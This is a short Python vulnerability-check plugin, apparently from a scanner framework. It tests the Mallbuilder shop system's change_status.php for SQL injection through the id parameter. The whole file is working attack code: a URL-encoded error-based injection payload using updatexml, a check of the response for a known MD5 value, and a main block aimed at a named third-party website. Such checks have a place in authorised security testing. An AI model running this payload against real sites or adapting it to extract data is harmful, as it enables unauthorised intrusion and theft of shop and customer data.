#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = Mallbuilder商城系统change_status.php id参数SQL注入漏洞
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0152481


def assign(service, arg):
    if service == 'mallbuilder':
        return True, arg


def audit(arg):
    payload = "pay/api/change_status.php?id=1%27%20or%20updatexml%281%2Cconcat%280x7e%2C%28SELECT%20md5%28123%29%20limit%200%2C1%29%29%2C0%29%20or%27"
    target = arg + payload

    code, head, res, errcode, _ = curl.curl2(target)
    if "202cb962ac59075b964b07152d234b7" in res:
        security_warning(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('mallbuilder', 'http://www.hehekeji.cn/')[1])